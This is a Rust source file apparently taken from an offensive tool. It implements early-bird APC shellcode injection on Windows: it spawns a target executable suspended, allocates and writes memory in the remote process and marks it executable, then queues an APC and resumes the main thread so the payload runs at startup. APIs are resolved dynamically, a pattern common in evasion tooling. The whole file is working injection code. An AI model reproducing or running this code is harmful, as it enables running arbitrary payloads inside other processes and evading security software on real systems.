use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    shellcode: &[u8],
    target_exe: &str,
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::wrappers::wrap_for_apc;
    use crate::resolve;
    use std::ffi::c_void;

    const CREATE_SUSPENDED: u32 = 0x00000004;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const MEM_RELEASE: u32 = 0x8000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;

    #[repr(C)]
    struct STARTUPINFOW {
        cb: u32,
        _reserved: *mut u16,
        _desktop: *mut u16,
        _title: *mut u16,
        _x: u32,
        _y: u32,
        _x_size: u32,
        _y_size: u32,
        _x_count_chars: u32,
        _y_count_chars: u32,
        _fill_attribute: u32,
        dw_flags: u32,
        w_show_window: u16,
        _cb_reserved2: u16,
        _lp_reserved2: *mut u8,
        h_std_input: *mut c_void,
        h_std_output: *mut c_void,
        h_std_error: *mut c_void,
    }

    #[repr(C)]
    struct PROCESS_INFORMATION {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_process_id: u32,
        dw_thread_id: u32,
    }

    let wrapped = wrap_for_apc(shellcode);
    let size = wrapped.len();

    log.step(format!(
        "[1/6] Create suspended process (\"{}\")",
        target_exe
    ));

    let mut target_wide: Vec<u16> = target_exe.encode_utf16().collect();
    target_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { core::mem::zeroed() };
    si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { core::mem::zeroed() };

    let created = unsafe {
        resolve::CreateProcessW(
            std::ptr::null(),
            target_wide.as_mut_ptr(),
            std::ptr::null(),
            std::ptr::null(),
            0,
            CREATE_SUSPENDED,
            std::ptr::null(),
            std::ptr::null(),
            &si as *const _ as *const c_void,
            &mut pi as *mut _ as *mut c_void,
        )
    };
    if created == 0 {
        return Err(format!(
            "process creation failed — check that \"{}\" exists and is executable",
            target_exe
        ));
    }
    log.info(format!(
        "      spawned suspended process PID {} (main thread TID {})",
        pi.dw_process_id, pi.dw_thread_id
    ));

    let process = pi.h_process;
    let thread = pi.h_thread;

    let cleanup_kill = |log: &LogSink| {
        log.detail("[cleanup] Killing spawned process");
        unsafe {
            resolve::TerminateProcess(process, 1);
            resolve::CloseHandle(thread);
            resolve::CloseHandle(process);
        }
    };

    log.step(format!("[2/6] Allocate remote memory ({} bytes)", size));
    let base = unsafe {
        resolve::VirtualAllocEx(
            process,
            std::ptr::null(),
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if base.is_null() {
        cleanup_kill(log);
        return Err("remote allocation failed".to_string());
    }
    log.info(format!(
        "      allocated RW region at remote address {:#p} ({} bytes)",
        base, size
    ));

    log.step(format!("[3/6] Write {} bytes", size));
    let mut written: usize = 0;
    let ok = unsafe {
        resolve::WriteProcessMemory(
            process,
            base as *const c_void,
            wrapped.as_ptr() as *const c_void,
            size,
            &mut written,
        )
    };
    if ok == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("remote write failed".to_string());
    }
    log.info(format!("      wrote {} bytes", written));

    log.step("[4/6] Set memory protection");
    let mut old_protect: u32 = 0;
    let ok = unsafe {
        resolve::VirtualProtectEx(
            process,
            base as *const c_void,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if ok == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("memory protection change failed".to_string());
    }
    log.info(format!(
        "      remote page is now PAGE_EXECUTE_READ (previous protection: {:#x})",
        old_protect
    ));

    log.step("[5/6] Queue APC to suspended main thread");
    let apc_func = base as *const c_void;
    if unsafe { resolve::QueueUserAPC(apc_func, thread, 0) } == 0 {
        unsafe { resolve::VirtualFreeEx(process, base, 0, MEM_RELEASE) };
        cleanup_kill(log);
        return Err("APC queue failed on suspended main thread".to_string());
    }
    log.info("      APC queued to main thread");

    log.step("[6/6] Resume thread — APC fires during init");
    unsafe { resolve::ResumeThread(thread) };
    unsafe { resolve::CloseHandle(thread) };
    unsafe { resolve::CloseHandle(process) };

    log.info("      main thread resumed — APC fires during process init");
    log.info(format!(
        "      payload at {:#p} ({} bytes, wrapped {}+38)",
        base,
        size,
        size - 38
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _shellcode: &[u8],
    _target_exe: &str,
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("requires Windows".to_string())
}
